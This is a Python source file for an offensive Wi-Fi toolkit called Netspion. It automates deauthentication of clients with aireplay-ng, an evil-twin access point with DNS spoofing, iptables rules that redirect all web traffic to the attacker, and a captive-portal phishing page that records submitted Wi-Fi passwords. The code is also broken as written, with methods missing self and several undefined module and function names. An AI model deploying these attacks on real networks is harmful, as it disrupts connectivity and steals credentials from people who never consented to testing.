import cmd2, platform, os
import utils.run_task as rt
from cmd2 import with_default_category
import utils.string_format as sf
from utils.check_var import check_vars
from utils.utils_shell import UtilsCommandSet

PLATFORM_SYSTEM = platform.system()


@with_default_category("Main commands")
class WifiShell(cmd2.Cmd):
    intro = sf.text(
        "Netspion Wifi Sub menu. Type help or ? to list commands and help/? COMMAND to show COMMAND help. \n"
    )
    prompt = sf.success("(netspion Wifi): ")

    def __init__(self):
        super().__init__(auto_load_commands=False)
        self.resultsPath = "/tmp/netspion/Wifi/"
        self.adapter = self.wifi_bssid = self.channel = self.device_bssid = (
            self.capfile
        ) = self.ap_adapter = self.ssid = self.ap_channel = ""
        self.add_settable(cmd2.Settable("adapter", str, "Wifi adapter name", self))
        self.add_settable(
            cmd2.Settable(
                "capfile",
                str,
                ".cap file path",
                self,
                completer=cmd2.Cmd.path_complete,
            )
        )
        self.add_settable(cmd2.Settable("wifi_bssid", str, "Target Wifi BSSID", self))
        self.add_settable(cmd2.Settable("channel", str, "Target Wifi Channel", self))
        self.add_settable(
            cmd2.Settable("device_bssid", str, "Target Device BSSID", self)
        )
        self.add_settable(cmd2.Settable("ap_adapter", str, "Adapter name for AP", self))
        self.add_settable(cmd2.Settable("ssid", str, "Wifi SSID for AP", self))
        self.add_settable(
            cmd2.Settable("ap_channel", str, "Channel number for AP", self)
        )
        self.register_command_set(UtilsCommandSet())
        self.default_category = "cmd2 Built-in Commands"
        self.remove_settable("debug")
        self.remove_settable("allow_style")
        self.remove_settable("always_show_hint")
        self.remove_settable("echo")
        self.remove_settable("feedback_to_output")
        self.remove_settable("max_completion_items")
        self.remove_settable("quiet")
        self.remove_settable("timing")
        self.poutput(
            sf.info("RUNNING ON: ")
            + sf.success(PLATFORM_SYSTEM + platform.release() + platform.version())
        )
        self.poutput(
            sf.info("ALL RESULTS WILL BE STORED IN: ") + sf.success(self.resultsPath)
        )
        os.makedirs(self.resultsPath, exist_ok=True)
        if os.path.isfile(self.resultsPath + "saved.conf"):
            reload = str(
                input("Saved config exists. Do you want to reload it? [y/n]: ")
            )
            if reload == "Y" or reload == "y":
                (
                    adapter,
                    wifi_bssid,
                    channel,
                    device_bssid,
                    capfile,
                    ap_adapter,
                    ssid,
                    ap_channel,
                ) = self.reloadConf()
        self.do_help("-v")

    def reloadConf(self):
        file = open(self.resultsPath + "saved.conf", "r")
        dict = {}
        for line in file.read().splitlines():
            string = line.split("=")
            dict.update({string[0]: string[1].strip()})
        self.adapter = dict["adapter"]
        self.wifi_bssid = dict["wifi_bssid"]
        self.channel = dict["channel"]
        self.device_bssid = dict["device_bssid"]
        self.capfile = dict["capfile"]
        self.ap_adapter = dict["ap_adapter"]
        self.ssid = dict["ssid"]
        self.ap_channel = dict["ap_channel"]
        return (
            self.adapter,
            self.wifi_bssid,
            self.channel,
            self.device_bssid,
            self.capfile,
            self.ap_adapter,
            self.ssid,
            self.ap_channel,
        )

    def deAuthAttack(wifi_bssid, adapter):
        if check_var([wifi_bssid, adapter]):
            device_bssid = str(input("Device BSSID [blank all]: "))
            if device_bssid:
                run_task.newTerminal(
                    [
                        "aireplay-ng",
                        "-0",
                        "0",
                        "-a",
                        wifi_bssid,
                        "-c",
                        device_bssid,
                        adapter,
                    ]
                )
            else:
                run_task.newTerminal(
                    [
                        "aireplay-ng",
                        "-0",
                        "0",
                        "-a",
                        wifi_bssid,
                        adapter,
                    ]
                )

    def rogueAPAttack(ssid, ap_adapter, ap_channel, resultsPath):
        if check_var([ssid, ap_adapter, ap_channel]):
            out_interface = str(input("Output interface to masquerade traffic: "))
            dnsmasqConf = open(resultsPath + "dnsmasq.conf", "w")
            # Make cfgs
            dnsmasqConf.write(
                f"""interface={ap_adapter}
    dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
    dhcp-option=3,192.168.2.1
    dhcp-option=6,192.168.2.1
    no-hosts
    addn-hosts={resultsPath}hosts
    no-resolv
    server=8.8.8.8
    log-queries
    log-dhcp
    listen-address=127.0.0.1
    listen-address=192.168.2.1"""
            )
            dnsmasqConf.close()
            hostapdConf = open(resultsPath + "hostapd.conf", "w")
            hostapdConf.write(
                f"""interface={ap_adapter}
    driver=nl80211
    ssid={ssid}
    hw_mode=g
    channel={ap_channel}
    macaddr_acl=0
    ignore_broadcast_ssid=0"""
            )
            hostapdConf.close()
            # Start AP
            run_task.newTerminal(
                [
                    "hostapd",
                    resultsPath + "hostapd.conf",
                ]
            )
            # Start DNS spoof & DHCP
            run_task.newTerminal(
                [
                    "dnsmasq",
                    "-C",
                    resultsPath + "dnsmasq.conf",
                    "-d",
                ]
            )
            # Set Firewall rules and network
            run_task.normalShell(
                f"ifconfig {ap_adapter} up 192.168.2.1 netmask 255.255.255.0;\
                            route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1;\
                            iptables-save > {resultsPath}iptables.bkp;\
                            iptables --flush;\
                            iptables --table nat --flush;\
                            iptables --delete-chain;\
                            iptables --table nat --delete-chain;\
                            iptables --table nat --append POSTROUTING --out-interface={out_interface} -j MASQUERADE;\
                            iptables --append FORWARD --in-interface {ap_adapter} -j ACCEPT;\
                            echo 1 > /proc/sys/net/ipv4/ip_forward;\
                            iptables -A INPUT -p tcp --dport 443 -j ACCEPT;\
                            iptables -A INPUT -p tcp --dport 80 -j ACCEPT;\
                            iptables -A INPUT -p udp --dport 53 -j ACCEPT;\
                            iptables -A INPUT -p udp --dport 67 -j ACCEPT;\
                            iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80;\
                            iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443"
            )
            # CP tmp Hosts file to be used with DNS spoof
            run_task.normalShell(f"cp ./EthicalHacking/Wifi/hosts {resultsPath}")

    def cpAttack(ssid, resultsPath, capfile):
        if check_var([ssid]):
            # Copy cfgs to tmp folder
            run_task.normalCapture(
                [
                    "cp",
                    "-Rv",
                    "./EthicalHacking/Wifi/captive_portal",
                    resultsPath,
                ]
            )
            run_task.normalCapture(
                ["chmod", "-R", "777", resultsPath + "captive_portal"]
            )

            print(string_format.info("\nPortals Availables"))
            run_task.normalShell(
                f"ls -l {resultsPath}captive_portal/portals | grep '^d' | cut -d ' ' -f10"
            )
            portal = str(input("\nSelect a portal name: "))

            run_task.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/WIFI_SSID/{ssid}/g",
                    f"{resultsPath}captive_portal/portals/{portal}/index.html",
                ]
            )

            run_task.normalCapture(
                [
                    "cp",
                    "./EthicalHacking/Wifi/captive_portal/check.php",
                    f"{resultsPath}captive_portal/portals/{portal}",
                ]
            )

            run_task.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s+CAP_FILE_PATH+{capfile}+g",
                    f"{resultsPath}captive_portal/portals/{portal}/check.php",
                ]
            )

            run_task.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/WIFI_SSID/{ssid}/g",
                    f"{resultsPath}captive_portal/portals/{portal}/check.php",
                ]
            )

            run_task.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/PORTAL_ROOT/{portal}/g",
                    f"{resultsPath}captive_portal/lighttpd.conf",
                ]
            )
            # Start Web server
            run_task.newTerminal(
                [
                    "lighttpd",
                    "-D",
                    "-f",
                    resultsPath + "captive_portal/lighttpd.conf",
                ]
            )
            # Monitor password hit
            run_task.newTerminal(["tail", "-f", resultsPath + "captive_portal/hit.txt"])


def main():
    WifiShell().do_clear(1)
    WifiShell().cmdloop()
